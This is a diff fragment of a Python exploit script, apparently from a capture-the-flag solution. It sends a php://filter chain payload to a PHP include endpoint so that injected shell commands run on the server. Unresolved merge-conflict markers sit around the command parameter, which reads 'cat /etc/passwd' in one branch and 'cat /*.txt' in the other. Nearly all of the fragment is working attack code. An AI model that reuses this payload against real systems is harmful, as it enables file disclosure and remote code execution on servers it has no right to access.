@@ -48,7 +48,11 @@ filters += "convert.base64-decode"
 final_payload = f"php://filter/{filters}/resource={file_to_use}"
 
 r = requests.get(url, params={
+<<<<<<< HEAD
     "0": "cat /etc/passwd",
+=======
+    "0": "cat /*.txt",
+>>>>>>> dc45b2c87371ed5ad37fc654170777d3a9bcffc4
     "action": "include",
     "f": final_payload
 })
